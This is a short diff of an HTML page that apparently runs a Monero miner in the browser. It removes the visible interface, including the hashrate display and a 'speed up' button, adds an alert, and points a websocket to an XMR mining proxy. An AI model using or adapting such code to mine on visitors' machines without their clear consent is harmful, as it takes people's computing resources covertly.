@@ -8,43 +8,15 @@
         body {
             background-color: rgb(0, 0, 41);
         }
-
-        button {
-            position: absolute;
-            font-size: larger;
-            font-weight: bolder;
-            opacity: 0.8;
-            z-index: 2222;
-        }
-
-        div {
-            text-align: center;
-        }
-
-        p {
-            position: absolute;
-            color: wheat;
-        }
     </style>
 </head>
 
 <body>
-    <marquee scrollamount="6" direction="down" width="98%" height="91%" behavior="alternate"
-        style="position:absolute;display:inline-block; text-shadow : 2px 2px 4px;">
-        <marquee id="mr" style="font-size: 250%" id="mr1" direction="left" scrollamount="20" behavior="alternate">
-            😁
-        </marquee>
-    </marquee>
-    <div>
-        <button onclick="speed_up()">speed up</button>
-    </div>
-    <p id="hashrate"></p>
-    <p style="margin-top: 10%;" id="info"></p>
 </body>
 
 <script src="script.js"></script>
 <script>
-
+    alert("mine");
     const isMobile = navigator.userAgentData.mobile;
 
     server = "wss://ny1.xmrminingproxy.com";
